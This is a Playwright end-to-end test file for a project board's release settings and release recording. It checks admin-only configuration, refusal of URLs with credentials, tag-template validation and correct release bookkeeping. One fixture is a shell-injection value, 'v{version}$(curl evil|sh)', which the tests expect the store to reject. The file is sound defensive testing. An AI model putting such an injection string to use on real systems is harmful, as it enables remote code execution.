/**
 * The release store at the level a direct PostgREST call meets it: a project
 * names where its production state lives, only its admin may say so, and a
 * url carrying credentials never reaches the table. A production state is
 * recorded once per card and version, and reads back on the card, the board
 * and the briefing.
 */
import { expect, test } from '@playwright/test';

import {
  admin,
  asUser,
  projectScope,
  psql,
  rpc,
} from '../helpers/board-store.js';
import { readSeedState } from '../helpers/runtime-state.js';
import { passwordGrantToken } from '../helpers/users.js';

const REPO = 'acme/memory-service';

interface CardJson {
  id: string;
  number: number;
  scope: string;
  state: string;
}

interface LandingJson {
  squash_sha: string;
  target: string | null;
  landed_at: string;
}

interface BranchJson {
  repo: string;
  branch: string;
  state: string;
  squash_sha: string | null;
  target: string | null;
  landed_at: string | null;
  landings: LandingJson[];
}

interface EventJson {
  type: string;
  from_state: string | null;
  to_state: string | null;
  reason: string | null;
  ref_kind: string | null;
  ref_target: string | null;
  branch_note: string | null;
  squash_sha: string | null;
  target_branch: string | null;
}

interface CardGetJson {
  error?: string;
  card: CardJson;
  branches: BranchJson[];
  events: EventJson[];
}

/**
 * The memories this file writes only to make a project scope, deleted when
 * the file is done so they do not crowd later specs.
 */
const markers: string[] = [];

test.afterAll(async () => {
  if (markers.length > 0) {
    await admin().from('memories').delete().in('id', markers);
  }
});

test.describe('Release settings in the store', () => {
  test('only a scope admin writes the setting; members read it; a bad url never lands', async () => {
    const seed = await readSeedState();
    const token = await passwordGrantToken(seed.userA);
    const scope = await projectScope(
      token,
      `release-settings-${Date.now()}`,
      markers
    );
    const db = asUser(token);

    const empty = await db
      .from('scope_release_settings')
      .select('*')
      .eq('scope', scope);
    expect(empty.error).toBeNull();
    expect(empty.data).toEqual([]);

    // Someone outside the project cannot name its production.
    const stranger = asUser(await passwordGrantToken(seed.userB));
    const foreign = await stranger
      .from('scope_release_settings')
      .insert({ scope, version_url: 'https://evil.example.com/x' });
    expect(foreign.error).not.toBeNull();

    // The admin can, but never with credentials in the url.
    const leaky = await db
      .from('scope_release_settings')
      .insert({ scope, version_url: 'https://user:pw@example.com/healthz' });
    expect(leaky.error?.message).toMatch(/check constraint/u);

    const urls = {
      'https://user:pw@example.com/healthz': 'f',
      'http://example.com/healthz': 'f',
      'ftp://example.com': 'f',
      'https://api.example.com/healthz': 't',
      'http://localhost:8788/healthz': 't',
      'http://127.0.0.1:8788/healthz': 't',
    };
    const verdicts = psql(
      'select ' +
        Object.keys(urls)
          .map((url) => `private.is_release_url('${url}')`)
          .join(', ')
    ).split('|');
    expect(verdicts).toEqual(Object.values(urls));
  });

  test('a tag template holds only what a git ref may, however it is written', async () => {
    const seed = await readSeedState();
    const token = await passwordGrantToken(seed.userA);
    const scope = await projectScope(
      token,
      `release-template-${Date.now()}`,
      markers
    );
    const db = asUser(token);

    // Written directly, the table refuses it.
    const direct = await db
      .from('scope_release_settings')
      .insert({ scope, tag_template: 'v{version}$(curl evil|sh)' });
    expect(direct.error?.message).toMatch(/check constraint/u);

    // Through the command, the refusal is an answer, and nothing is written.
    for (const bad of [
      'v{version}$(curl evil|sh)',
      '-{version}',
      'v{version}{version}',
      `v{version}${'x'.repeat(100)}`,
    ]) {
      const refused = await rpc<{ error?: string }>(db, 'release_configure', {
        p_scope: scope,
        p_tag_template: bad,
      });
      expect(refused.error).toBe('invalid');
    }
    const nullPolicy = await rpc<{ error?: string }>(db, 'release_configure', {
      p_scope: scope,
      p_on_release: null,
    });
    expect(nullPolicy.error).toBe('invalid');
    const none = await rpc<{ settings: unknown }>(db, 'release_settings', {
      p_scope: scope,
    });
    expect(none.settings).toBeNull();

    for (const good of [
      'release/{version}',
      'v{version}-final',
      '{version}',
      'pkg@{version}',
      '@scope/pkg@{version}',
      'v{version}+stable',
    ]) {
      const set = await rpc<{ settings: { tag_template: string } }>(
        db,
        'release_configure',
        {
          p_scope: scope,
          p_tag_template: good,
        }
      );
      expect(set.settings.tag_template).toBe(good);
    }
  });
});

test.describe('Release commands in the store', () => {
  test('configure is the admin’s; settings read back; a bad field is refused whole', async () => {
    const seed = await readSeedState();
    const token = await passwordGrantToken(seed.userA);
    const scope = await projectScope(
      token,
      `release-config-${Date.now()}`,
      markers
    );
    const db = asUser(token);

    const none = await rpc<{ settings: unknown }>(db, 'release_settings', {
      p_scope: scope,
    });
    expect(none.settings).toBeNull();

    const set = await rpc<{
      settings: { version_url: string; on_release: string };
    }>(db, 'release_configure', {
      p_scope: scope,
      p_version_url: 'https://api.example.com/healthz',
    });
    expect(set.settings).toMatchObject({
      version_url: 'https://api.example.com/healthz',
      tag_template: 'v{version}',
      on_release: 'record',
    });

    const bad = await rpc<{ error?: string }>(db, 'release_configure', {
      p_scope: scope,
      p_version_url: 'https://u:p@api.example.com/healthz',
    });
    expect(bad.error).toBe('invalid');
    const kept = await rpc<{ settings: { version_url: string } }>(
      db,
      'release_settings',
      { p_scope: scope }
    );
    expect(kept.settings.version_url).toBe('https://api.example.com/healthz');

    // Outside the project the scope does not exist; a writer who is not its
    // admin may record a release but not say where production lives.
    const tokenB = await passwordGrantToken(seed.userB);
    const asB = asUser(tokenB);
    const unseen = await rpc<{ error?: string }>(asB, 'release_configure', {
      p_scope: scope,
      p_version_url: 'https://evil.example.com/x',
    });
    expect(unseen.error).toBe('not_found');

    const userBId = psql(
      `select id from public.profiles where user_id = '${seed.userB.id}'`
    );
    await rpc(db, 'add_scope_member', {
      p_scope: scope,
      p_user: userBId,
      p_role: 'writer',
    });
    await rpc(asB, 'accept_scope_invitation', { p_scope: scope });

    const refused = await rpc<{ error?: string }>(asB, 'release_configure', {
      p_scope: scope,
      p_version_url: 'https://evil.example.com/x',
    });
    expect(refused.error).toBe('forbidden');
    const recorded = await rpc<{ release: { version: string } }>(
      asB,
      'release_record',
      {
        p_scope: scope,
        p_version: '0.1.0',
        p_build: null,
        p_release_commit: 'abcdef1',
        p_source: 'url',
        p_card_ids: [],
      }
    );
    expect(recorded.release.version).toBe('0.1.0');
  });

  test('a release is recorded once per card and version, and the first observer is kept', async () => {
    const seed = await readSeedState();
    const token = await passwordGrantToken(seed.userA);
    const scope = await projectScope(
      token,
      `release-record-${Date.now()}`,
      markers
    );
    const db = asUser(token);
    const { card } = await rpc<{ card: CardJson }>(db, 'card_create', {
      p_no_links: 'e2e fixture',
      p_scope: scope,
      p_title: 'Shipped work',
      p_type: 'task',
    });
    await rpc(db, 'card_move', {
      p_card_id: card.id,
      p_to_state: 'waiting',
      p_reason: 'set by hand',
    });
    await rpc(db, 'card_land', {
      p_card_id: card.id,
      p_repo: REPO,
      p_branch: 'feature/shipped',
      p_squash_sha: 'aaaaaaa',
      p_target: 'main',
      p_reason: 'landed',
    });

    const candidates = await rpc<{
      cards: Array<{ id: string; landings: unknown[] }>;
    }>(db, 'release_candidates', { p_scope: scope, p_version: '1.2.0' });
    expect(candidates.cards.map((c) => c.id)).toEqual([card.id]);
    expect(candidates.cards[0]?.landings).toEqual([
      { repo: REPO, branch: 'feature/shipped', squash_sha: 'aaaaaaa' },
    ]);

    const args = {
      p_scope: scope,
      p_version: '1.2.0',
      p_build: 'abc1234',
      p_release_commit: 'bbbbbbb',
      p_source: 'url',
      p_card_ids: [card.id],
    };
    const first = await rpc<{
      release: { first_observed: boolean };
      recorded: string[];
      moved: string[];
    }>(db, 'release_record', args);
    expect(first.release.first_observed).toBe(true);
    expect(first.recorded).toEqual([card.id]);
    expect(first.moved).toEqual([]);

    const again = await rpc<{
      release: { first_observed: boolean };
      recorded: string[];
    }>(db, 'release_record', args);
    expect(again.release.first_observed).toBe(false);
    expect(again.recorded).toEqual([]);

    const read = await rpc<
      CardGetJson & {
        card: CardJson & { state: string };
        releases: Array<{ version: string }>;
      }
    >(db, 'card_get', { p_card_id: card.id });
    expect(read.card.state).toBe('waiting');
    expect(read.releases.map((r) => r.version)).toEqual(['1.2.0']);
    expect(read.events.filter((e) => e.type === 'released')).toHaveLength(1);

    // Already released at this version: no longer a candidate.
    const after = await rpc<{ cards: unknown[] }>(db, 'release_candidates', {
      p_scope: scope,
      p_version: '1.2.0',
    });
    expect(after.cards).toEqual([]);

    const listed = await rpc<{
      cards: Array<{ id: string; released_in: string | null }>;
    }>(db, 'board_list', { p_scope: scope });
    expect(listed.cards.find((c) => c.id === card.id)?.released_in).toBe(
      '1.2.0'
    );
  });

  test('the policy switch moves carried waiting cards to done, and only them', async () => {
    const seed = await readSeedState();
    const token = await passwordGrantToken(seed.userA);
    const scope = await projectScope(
      token,
      `release-policy-${Date.now()}`,
      markers
    );
    const db = asUser(token);
    await rpc(db, 'release_configure', {
      p_scope: scope,
      p_on_release: 'record_and_move_done',
    });
    const make = async (title: string, state: string) => {
      const { card } = await rpc<{ card: CardJson }>(db, 'card_create', {
        p_no_links: 'e2e fixture',
        p_scope: scope,
        p_title: title,
        p_type: 'task',
      });
      if (state !== 'idea') {
        await rpc(db, 'card_move', {
          p_card_id: card.id,
          p_to_state: state,
          p_reason: 'set by hand',
        });
      }
      return card;
    };
    const waiting = await make('Waiting for the release', 'waiting');
    const parked = await make('Parked but carried', 'parked');
    const result = await rpc<{ moved: string[]; recorded: string[] }>(
      db,
      'release_record',
      {
        p_scope: scope,
        p_version: '2.0.0',
        p_build: null,
        p_release_commit: 'ccccccc',
        p_source: 'tag',
        p_card_ids: [waiting.id, parked.id],
      }
    );
    expect(result.recorded.sort()).toEqual([waiting.id, parked.id].sort());
    expect(result.moved).toEqual([waiting.id]);
    const moved = await rpc<{
      card: { state: string };
      events: Array<{ type: string; reason: string | null }>;
    }>(db, 'card_get', { p_card_id: waiting.id });
    expect(moved.card.state).toBe('done');
    expect(moved.events.at(-1)).toMatchObject({ type: 'moved' });
    expect(moved.events.at(-1)?.reason).toContain('2.0.0');
  });

  test('a record naming another scope’s card, or a bad sha, writes nothing', async () => {
    const seed = await readSeedState();
    const token = await passwordGrantToken(seed.userA);
    const db = asUser(token);
    const mine = await projectScope(
      token,
      `release-own-${Date.now()}`,
      markers
    );
    const other = await projectScope(
      token,
      `release-other-${Date.now()}`,
      markers
    );
    const { card } = await rpc<{ card: CardJson }>(db, 'card_create', {
      p_no_links: 'e2e fixture',
      p_scope: other,
      p_title: 'Elsewhere',
      p_type: 'task',
    });

    const foreign = await rpc<{ recorded: string[] }>(db, 'release_record', {
      p_scope: mine,
      p_version: '3.0.0',
      p_build: null,
      p_release_commit: 'ddddddd',
      p_source: 'url',
      p_card_ids: [card.id],
    });
    expect(foreign.recorded).toEqual([]);

    const bad = await rpc<{ error?: string }>(db, 'release_record', {
      p_scope: mine,
      p_version: '3.0.1',
      p_build: null,
      p_release_commit: 'not-a-sha',
      p_source: 'url',
      p_card_ids: [],
    });
    expect(bad.error).toBe('invalid');
    expect(
      psql(
        `select count(*) from public.scope_releases where scope = '${mine}' and version = '3.0.1'`
      )
    ).toBe('0');
  });

  test('a briefing names the production state and the release of its cards', async () => {
    const seed = await readSeedState();
    const token = await passwordGrantToken(seed.userA);
    const scope = await projectScope(
      token,
      `release-brief-${Date.now()}`,
      markers
    );
    const db = asUser(token);
    const { card } = await rpc<{ card: CardJson }>(db, 'card_create', {
      p_no_links: 'e2e fixture',
      p_scope: scope,
      p_title: 'Briefed release',
      p_type: 'task',
    });
    await rpc(db, 'card_move', {
      p_card_id: card.id,
      p_to_state: 'waiting',
      p_reason: 'set by hand',
    });
    await rpc(db, 'release_record', {
      p_scope: scope,
      p_version: '4.1.0',
      p_build: 'feedbee',
      p_release_commit: 'eeeeeee',
      p_source: 'url',
      p_card_ids: [card.id],
    });
    const work = await rpc<{
      production: { version: string; build: string } | null;
      lead: Array<{ id: string; released_in: string | null }>;
    }>(db, 'briefing_work', { p_scope: scope });
    expect(work.production).toMatchObject({
      version: '4.1.0',
      build: 'feedbee',
    });
    expect(work.lead.find((c) => c.id === card.id)?.released_in).toBe('4.1.0');
  });

  test('a production state that returns is current again, and its first observation stands', async () => {
    const seed = await readSeedState();
    const token = await passwordGrantToken(seed.userA);
    const scope = await projectScope(
      token,
      `release-return-${Date.now()}`,
      markers
    );
    const db = asUser(token);
    const record = (version: string, commit: string) =>
      rpc<{
        release: {
          version: string;
          release_commit: string;
          observed_at: string;
          first_observed: boolean;
        };
      }>(db, 'release_record', {
        p_scope: scope,
        p_version: version,
        p_build: null,
        p_release_commit: commit,
        p_source: 'url',
        p_card_ids: [],
      });

    const first = await record('0.24.3', 'aaaaaaa');
    await record('0.25.0', 'bbbbbbb');
    // Rolled back: the earlier state is what production runs again.
    const back = await record('0.24.3', 'ccccccc');
    expect(first.release.first_observed).toBe(true);
    expect(back.release.first_observed).toBe(false);
    expect(back.release).toMatchObject({
      release_commit: 'aaaaaaa',
      observed_at: first.release.observed_at,
    });

    const work = await rpc<{ production: { version: string } | null }>(
      db,
      'briefing_work',
      { p_scope: scope }
    );
    expect(work.production?.version).toBe('0.24.3');

    // Only the last sighting moves: the first observation is not writable.
    const rewrite = await db
      .from('scope_releases')
      .update({ release_commit: 'ddddddd' })
      .eq('scope', scope)
      .eq('version', '0.24.3');
    expect(rewrite.error).not.toBeNull();
  });

  test('a release marks what landed since the last one, and a card that lands again is a candidate again', async () => {
    const seed = await readSeedState();
    const token = await passwordGrantToken(seed.userA);
    const scope = await projectScope(
      token,
      `release-since-${Date.now()}`,
      markers
    );
    const db = asUser(token);
    const { card } = await rpc<{ card: CardJson }>(db, 'card_create', {
      p_no_links: 'e2e fixture',
      p_scope: scope,
      p_title: 'Landed twice',
      p_type: 'task',
    });
    await rpc(db, 'card_move', {
      p_card_id: card.id,
      p_to_state: 'waiting',
      p_reason: 'set by hand',
    });
    const land = (sha: string) =>
      rpc(db, 'card_land', {
        p_card_id: card.id,
        p_repo: REPO,
        p_branch: 'feature/twice',
        p_squash_sha: sha,
        p_target: 'main',
        p_reason: 'landed',
      });
    const candidates = async (version: string) =>
      (
        await rpc<{
          cards: Array<{ id: string; landings: Array<{ squash_sha: string }> }>;
        }>(db, 'release_candidates', {
          p_scope: scope,
          p_version: version,
        })
      ).cards;

    await land('aaaaaaa');
    await rpc(db, 'release_record', {
      p_scope: scope,
      p_version: '1.0.0',
      p_build: null,
      p_release_commit: 'aaaaaaa',
      p_source: 'tag',
      p_card_ids: [card.id],
    });
    expect(await candidates('1.1.0')).toEqual([]);

    // A fix lands in the same branch: the next release carries it, and the
    // candidate names only that landing — the earlier one is already in
    // every later release, so it proves nothing about this one.
    await land('bbbbbbb');
    const again = await candidates('1.1.0');
    expect(again.map((c) => c.id)).toEqual([card.id]);
    expect(again[0]?.landings).toEqual([
      { repo: REPO, branch: 'feature/twice', squash_sha: 'bbbbbbb' },
    ]);
  });

  test('a card that lands again while an observer looks keeps its candidacy', async () => {
    const seed = await readSeedState();
    const token = await passwordGrantToken(seed.userA);
    const scope = await projectScope(
      token,
      `release-race-${Date.now()}`,
      markers
    );
    const db = asUser(token);
    await rpc(db, 'release_configure', {
      p_scope: scope,
      p_on_release: 'record_and_move_done',
    });
    const { card } = await rpc<{ card: CardJson }>(db, 'card_create', {
      p_no_links: 'e2e fixture',
      p_scope: scope,
      p_title: 'Landed while looked at',
      p_type: 'task',
    });
    await rpc(db, 'card_move', {
      p_card_id: card.id,
      p_to_state: 'waiting',
      p_reason: 'set by hand',
    });
    const land = (sha: string) =>
      rpc(db, 'card_land', {
        p_card_id: card.id,
        p_repo: REPO,
        p_branch: 'feature/raced',
        p_squash_sha: sha,
        p_target: 'main',
        p_reason: 'landed',
      });
    const candidates = async () =>
      (
        await rpc<{ cards: Array<{ id: string; landing_seq: number }> }>(
          db,
          'release_candidates',
          { p_scope: scope, p_version: '5.0.0' }
        )
      ).cards;
    const record = (version: string, cardIds: string[], seqs: number[]) =>
      rpc<{ error?: string; recorded: string[]; moved: string[] }>(
        db,
        'release_record',
        {
          p_scope: scope,
          p_version: version,
          p_build: null,
          p_release_commit: 'aaaaaaa',
          p_source: 'tag',
          p_card_ids: cardIds,
          p_landing_seqs: seqs,
        }
      );

    await land('aaaaaaa');
    const looked = (await candidates())[0]?.landing_seq ?? -1;
    expect(looked).toBeGreaterThan(0);

    // Another session lands the card again before the observer records what
    // it checked: the release it records does not carry the new landing.
    await land('bbbbbbb');
    const stale = await record('5.0.0', [card.id], [looked]);
    expect(stale.recorded).toEqual([]);
    expect(stale.moved).toEqual([]);
    const still = await candidates();
    expect(still.map((c) => c.id)).toEqual([card.id]);
    expect(still[0]?.landing_seq).toBeGreaterThan(looked);
    const kept = await rpc<{ card: { state: string } }>(db, 'card_get', {
      p_card_id: card.id,
    });
    expect(kept.card.state).toBe('waiting');

    // The landing the observer checked is still the latest: recorded, moved.
    const fresh = await record(
      '5.0.1',
      [card.id],
      [still[0]?.landing_seq ?? -1]
    );
    expect(fresh.recorded).toEqual([card.id]);
    expect(fresh.moved).toEqual([card.id]);

    // One landing per card, or nothing is written.
    const uneven = await record('5.0.2', [card.id], [1, 2]);
    expect(uneven.error).toBe('invalid');
    expect(
      psql(
        `select count(*) from public.scope_releases where scope = '${scope}' and version = '5.0.2'`
      )
    ).toBe('0');
  });
});
